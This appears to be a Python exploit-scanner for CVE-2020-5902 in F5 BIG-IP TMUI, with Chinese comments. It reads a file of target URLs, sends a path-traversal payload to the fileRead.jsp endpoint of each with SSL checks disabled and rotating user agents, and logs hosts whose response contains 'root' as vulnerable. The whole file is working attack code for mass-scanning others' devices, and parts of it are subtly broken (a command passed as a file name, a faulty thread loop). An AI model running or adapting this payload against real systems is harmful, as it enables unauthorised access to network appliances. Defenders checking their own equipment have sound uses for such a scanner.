#F5 BIG-IP TMUI （CVE-2020-5902）远程代码执行漏洞

import requests
import time
import sys
import threading
import  optparse
import random
import warnings





class Scan_F5(threading.Thread):

    def __init__(self,cmd):
        super(Scan_F5, self).__init__()
        self.cmd = cmd
    def run(self):

        try:
            user_agent_list = [
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 "
                "(KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
                "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 "
                "(KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 "
                "(KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 "
                "(KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 "
                "(KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
                "(KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
                "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 "
                "(KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 "
                "(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 "
                "(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 "
                "(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 "
                "(KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 "
                "(KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 "
                "(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 "
                "(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 "
                "(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 "
                "(KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 "
                "(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 "
                "(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"
            ]
            headers = {
                'User-Agent': random.choice(user_agent_list),
                'Accept': 'text / html, application / xhtml + xml, application / xml;q = 0.9, image / webp, * / *;q = 0.8',
                'Accept-Language': 'zh - CN, zh;q = 0.8, zh - TW;= 0.7, zh - HK;q = 0.5, en - US;q = 0.3, en;q = 0.2',
                'Connection': 'close',
                'Cookie': '__lnk_uid=34059114-5521-4534-8918-48044192585b',
                'Upgrade-Insecure-Requests': '1'
            }
            with open("{}".format(file),'r') as f:
                urls = f.readlines()
                for base_url in urls:
                    base_url = base_url.strip()
                    payload = "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={}".format(self.cmd)
                    url = base_url + payload

                    # 忽略ssl警告信息
                    warnings.filterwarnings("ignore")
                    res = requests.get(url=url,headers=headers,verify=False)
                    #这里判断的条件是只要输出的结果中包含uid就可以判断存在漏洞
                    result = 'root' in res.text
                    if result == True:
                        print("\033[31m{}存在CVE-2020-5902漏洞\033[0m".format(base_url))
                        with open('{}'.format(outfile),'a+') as f:
                            f.writelines(base_url+'\n')
                    else:
                        print("{}不存在CVE-2020-5902漏洞".format(base_url))
        except:
            pass

if __name__ == '__main__':
    try:
        #设置参数
        usage = "python -u url.txt -o F5.txt"
        parse = optparse.OptionParser(usage)
        parse.add_option('-u', '--file', dest="file", help="Enter a url file")
        parse.add_option('-o', '--outfile', dest="outfile", help="Enter a out file")
        (options, arges) = parse.parse_args()
        if options.file == None:
            print(parse.usage)
            sys.exit(0)
        else:
            file = options.file
            outfile = options.outfile
        threads = []
        threads_count = int(10)

        for i in range(threads_count):
            t1 = Scan_F5('whoami')
            threads.append(t1)

        for t in threads:
            if  not t1.isAlive():
                t1.start()
            else:
                continue
        for t in threads:
            t1.join()
    except Exception as e:
        print(e)
